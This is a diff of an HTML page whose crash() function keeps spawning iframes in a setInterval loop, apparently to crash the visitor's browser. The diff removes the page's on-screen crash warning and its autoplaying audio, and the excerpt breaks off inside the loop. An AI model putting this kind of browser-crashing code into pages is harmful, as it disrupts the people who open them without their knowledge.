@@ -8,22 +8,8 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
   </head>
   <body>
-    <div class="font">
-      <p>Are you sure this isnt a scam ?</p>
-      <p style="font-size: 10px;">Your browser will crash, beware.</p>
-      <p>starting the process....</p>
-      <br>
-      <audio id="audio" controls autoplay>
-        <source src="./audio.mp3" type="audio/mpeg">
-        Your browser does not support the audio element.
-      </audio>
-    </div>
     <script>
       function crash(){
-        var audio = document.getElementById("audio");
-  audio.play();
-        var audio = document.getElementById("audio");
-        audio.play();
         
         setInterval(function() {
           var iframe = document.createElement('iframe');
